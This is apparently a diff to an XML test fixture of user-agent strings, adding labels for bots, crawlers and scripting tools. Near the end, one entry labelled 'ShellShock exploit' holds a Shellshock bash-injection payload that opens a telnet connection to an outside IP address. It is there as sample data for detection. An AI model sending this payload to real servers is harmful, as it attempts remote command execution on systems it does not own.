@@ -3,11 +3,13 @@
     <strings>
         <string>
             <field name="browser">Opera</field>
-            <field name="browser_version">21.0.1432.67</field>
+            <field name="version">21.0.1432.67</field>
             <field name="os">OS X</field>
             <field name="os_version">10.9.3</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko)
                 Chrome/34.0.1847.132 Safari/537.36 OPR/21.0.1432.67
@@ -20,6 +22,8 @@
             <field name="os_version">3.2</field>
             <field name="device">iPad</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko)
                 Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
@@ -32,6 +36,8 @@
             <field name="os_version">8.1.2</field>
             <field name="device">iPhone</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko)
                 Version/8.0 Mobile/12B440 Safari/600.1.4
@@ -44,6 +50,8 @@
             <field name="os_version">10.10.2</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko)
                 Chrome/41.0.2272.118 Safari/537.36
@@ -56,6 +64,8 @@
             <field name="os_version">10.10.2</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko)
                 Chrome/42.0.2311.152 YaBrowser/15.6.2311.3451 (beta) Yowser/2.0 Safari/537.36
@@ -68,6 +78,8 @@
             <field name="os_version">7</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;
                 .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
@@ -80,6 +92,8 @@
             <field name="os_version">10.10</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0
             </field>
@@ -91,6 +105,8 @@
             <field name="os_version">8.1.2</field>
             <field name="device">iPhone</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko)
                 OPiOS/10.1.1.92212 Mobile/12B440 Safari/9537.53
@@ -103,6 +119,8 @@
             <field name="os_version">8.1.2</field>
             <field name="device">iPhone</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko)
                 CriOS/43.0.2357.51 Mobile/12B440 Safari/600.1.4
@@ -115,6 +133,8 @@
             <field name="os_version">10.0</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
                 Edge/12.10136
@@ -127,6 +147,8 @@
             <field name="os_version">10.0</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
             </field>
@@ -138,6 +160,8 @@
             <field name="os_version">7</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Vivaldi/1.0.83.38 Safari/537.36
             </field>
@@ -149,6 +173,8 @@
             <field name="os_version">47.0.2526.80</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (X11; CrOS x86_64 7520.62.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36
             </field>
@@ -160,6 +186,8 @@
             <field name="os_version">7</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
             </field>
@@ -171,6 +199,8 @@
             <field name="os_version">7</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
             </field>
@@ -182,6 +212,8 @@
             <field name="os_version">7</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
             </field>
@@ -193,6 +225,8 @@
             <field name="os_version">7</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
             </field>
@@ -204,6 +238,8 @@
             <field name="os_version">8</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7
             </field>
@@ -215,6 +251,8 @@
             <field name="os_version">unknown</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5
             </field>
@@ -226,6 +264,8 @@
             <field name="os_version">10.0.9.2372</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (BB10; Touch) AppleWebKit/537.10+ (KHTML, like Gecko) Version/10.0.9.2372 Mobile Safari/537.10+
             </field>
@@ -237,6 +277,8 @@
             <field name="os_version">10</field>
             <field name="device">Lumia 640 LTE</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393
             </field>
@@ -248,6 +290,8 @@
             <field name="os_version">7.1.0.523</field>
             <field name="device">unknown</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (BlackBerry; U; BlackBerry 9380; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.523 Mobile Safari/534.11+
             </field>
@@ -259,8 +303,699 @@
             <field name="os_version">5.1.1</field>
             <field name="device">Samsung SM-G360T1</field>
             <field name="device_version">unknown</field>
+            <field name="scripted_agent">unknown</field>
+            <field name="scripted_agent_type">unknown</field>
             <field name="string">
                 Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G360T1 Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36
+            </field>
+        </string>
+        <string>
+            <field name="browser">Safari</field>
+            <field name="version">unknown</field>
+            <field name="os">Linux</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">wkhtmltopdf</field>
+            <field name="scripted_agent_type">Tool</field>
+            <field name="string">
+                Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf-amd64 Safari/534.34
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Baidu</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Baidu</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Baiduspider+(+http://www.baidu.com/search/spider_jp.html)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Baidu</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                BaiDuSpider
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Googlebot/2.1 (+http://www.google.com/bot.html)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Chrome</field>
+            <field name="version">41.0.2272.96</field>
+            <field name="os">Android</field>
+            <field name="os_version">6.0.1</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                ​Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Googlebot-News
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Googlebot-Image/1.0
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Googlebot-Video/1.0
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google Ads</field>
+            <field name="scripted_agent_type">Ad bots</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google Ads</field>
+            <field name="scripted_agent_type">Ad bots</field>
+            <field name="string">
+                Mediapartners-Google
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google Ads</field>
+            <field name="scripted_agent_type">Ad bots</field>
+            <field name="string">
+                AdsBot-Google (+http://www.google.com/adsbot.html)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google Ads</field>
+            <field name="scripted_agent_type">Ad bots</field>
+            <field name="string">
+                AdsBot-Google-Mobile-Apps
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Yahoo! Slurp</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Bing</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">MSN</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                msnbot/2.0b (+http://search.msn.com/msnbot.htm)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">MSN</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Bing</field>
+            <field name="scripted_agent_type">Ad bots</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">Windows</field>
+            <field name="os_version">7</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Bing</field>
+            <field name="scripted_agent_type">Preview</field>
+            <field name="string">
+                Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">W3C Validator</field>
+            <field name="scripted_agent_type">Tool</field>
+            <field name="string">
+                W3C_Validator/1.0 libwww-perl/0.40
+            </field>
+        </string>
+        <string>
+            <field name="browser">Safari</field>
+            <field name="version">8.0</field>
+            <field name="os">iOS</field>
+            <field name="os_version">8.1</field>
+            <field name="device">iPhone</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Yandex</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Gluten Free</field>
+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; Gluten Free Crawler/1.0; +http://glutenfreepleasure.com/)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Twitter</field>
+            <field name="scripted_agent_type">Preview</field>
+            <field name="string">
+                Twitterbot/1.0
+            </field>
+        </string>
+        <string>
+            <field name="browser">Safari</field>
+            <field name="version">8.0.2</field>
+            <field name="os">OS X</field>
+            <field name="os_version">10.10.1</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Apple</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Paper.li</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">SocialRank.io</field>
+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                SocialRankIOBot; http://socialrank.io/about
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Ahrefs.com Backlink Research Tool</field>
+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Majestic12</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">LiveLap</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                LivelapBot/0.2 (http://site.livelap.com/crawler)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">Windows</field>
+            <field name="os_version">7</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Skype</field>
+            <field name="scripted_agent_type">Preview</field>
+            <field name="string">
+                Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
+            </field>
+        </string>
+        <string>
+            <field name="browser">Safari</field>
+            <field name="version">unknown</field>
+            <field name="os">Linux</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">AdBeat</field>
+            <field name="scripted_agent_type">Ad bots</field>
+            <field name="string">
+                Mozilla/5.0 (X11; U; Linux x86; %lang_code%) adbeat.com/policy Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3 AppleWebKit/532.4 Safari/532.4
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Facebook</field>
+            <field name="scripted_agent_type">Preview</field>
+            <field name="string">
+                facebookexternalhit/1.0
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">WEBDAV</field>
+            <field name="scripted_agent_type">Tool</field>
+            <field name="string">
+                WEBDAV Client
+            </field>
+        </string>
+        <string>
+            <field name="browser">Firefox</field>
+            <field name="version">6.0</field>
+            <field name="os">Windows</field>
+            <field name="os_version">7</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Google Favicon</field>
+            <field name="scripted_agent_type">Scripted Agent</field>
+            <field name="string">
+                Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">MetaURI</field>
+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                MetaURI API/2.0 metauri.com
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">TLSProbe</field>
+            <field name="scripted_agent_type">Tool</field>
+            <field name="string">
+                TLSProbe/1.0 (+https://scan.trustnet.venafi.com/)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Safari</field>
+            <field name="version">unknown</field>
+            <field name="os">Linux</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Scoop.it</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) imgsizer Safari/537.21
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Netcraft SSL</field>
+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                Netcraft SSL Server Survey - contact info@netcraft.com
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Curl</field>
+            <field name="scripted_agent_type">Scripted Agent</field>
+            <field name="string">
+                curl/7.37.0
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Python</field>
+            <field name="scripted_agent_type">Scripted Agent</field>
+            <field name="string">
+                python-urllib/12.0
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">GoLang</field>
+            <field name="scripted_agent_type">Scripted Agent</field>
+            <field name="string">
+                Go-http-client/1.0
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Perl</field>
+            <field name="scripted_agent_type">Scripted Agent</field>
+            <field name="string">
+                libwww-perl/1.0
+            </field>
+        </string>
+        <string>
+            <field name="browser">Firefox</field>
+            <field name="version">3.5.3</field>
+            <field name="os">Linux</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Verisign</field>
+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.3; ips-agent) Gecko/20090824 Fedora/1.0.7-1.1.fc4 Firefox/3.5.3
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">Linux</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Wget</field>
+            <field name="scripted_agent_type">Tool</field>
+            <field name="string">
+                Wget/1.13.4 (linux-gnu)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">ZGrab</field>
+            <field name="scripted_agent_type">Tool</field>
+            <field name="string">
+                Mozilla/5.0 zgrab/0.3
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Java</field>
+            <field name="scripted_agent_type">Scripted Agent</field>
+            <field name="string">
+                Java/1.6.0_14
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">ShellShock exploit</field>
+            <field name="scripted_agent_type">Exploit attempt</field>
+            <field name="string">
+                () { :;}; /bin/bash -c \x22telnet 197.242.148.29 9999\x22 () { :; }; echo -e \x22Content-Type: text/plain\x5Cn\x22; echo qQQQQQq
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">BrowserShots</field>
